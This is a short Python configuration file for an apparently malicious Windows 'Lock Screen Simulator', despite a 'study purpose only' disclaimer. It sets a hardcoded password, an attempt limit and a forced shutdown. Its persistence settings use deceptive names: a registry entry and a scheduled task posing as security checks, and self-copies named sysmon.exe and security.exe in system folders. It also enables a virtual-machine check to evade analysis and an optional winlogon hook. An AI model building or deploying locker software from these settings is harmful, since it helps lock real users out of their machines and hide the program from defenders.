"""
Configuration settings for Lock Screen Simulator
STUDY PURPOSE ONLY - NOT FOR MALICIOUS USE
"""

CONFIG = {
    # ── Authentication ──
    "correct_password": "admin123",
    "max_attempts": 3,
    "cooldown_duration": 30,        # seconds
    "shutdown_delay": 10,           # seconds
    
    # ── Decoy Passwords (Social Engineering Study) ──
    "decoy_passwords": {
        "backdoor": "🔓 Unlocked via backdoor",
        "reset": "🔄 Rebooting system...",
        "kill": "🛑 Self-destruct initiated"
    },
    
    # ── Persistence ──
    "registry_name": "SystemSecurityMonitor",
    "task_name": "SecurityHealthCheck",
    "file_copies": [
        "C:\\Windows\\Temp\\sysmon.exe",
        "C:\\ProgramData\\Microsoft\\Security\\security.exe"
    ],
    
    # ── Features ──
    "enable_network_logging": False,
    "check_vm": True,
    "show_biometric": True,
    "audio_enabled": True,
    "use_winlogon_hook": False,     # Aggressive - use with caution
    
    # ── Logging ──
    "log_file": "lock_simulator_log.json",
    "detailed_logging": True
}
